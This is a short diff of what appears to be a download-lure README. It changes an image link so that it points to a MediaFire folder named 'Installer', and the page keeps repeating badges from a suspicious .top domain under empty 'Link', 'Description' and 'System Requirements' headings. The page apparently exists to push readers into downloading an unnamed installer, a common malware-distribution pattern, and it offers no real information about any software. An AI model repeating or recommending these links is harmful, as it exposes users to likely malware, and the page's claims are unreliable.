@@ -1,6 +1,6 @@
 [![https://evrsq.vroja.top/ofiqm](https://evrsq.vroja.top/vrjyb)](https://www.mediafire.com/folder/p85tmglmq4kg8/Installer)
 # ✅ Link:
-[![https://evrsq.vroja.top/ofiqm](https://evrsq.vroja.top/qlclc)](https://evrsq.vroja.top/ofiqm)
+[![https://evrsq.vroja.top/ofiqm](https://evrsq.vroja.top/qlclc)](https://www.mediafire.com/folder/p85tmglmq4kg8/Installer)
 # 💻 Description:
 [![https://evrsq.vroja.top/ofiqm](https://evrsq.vroja.top/udvjb)](https://evrsq.vroja.top/ofiqm)
 # 🛠 System Requirements:
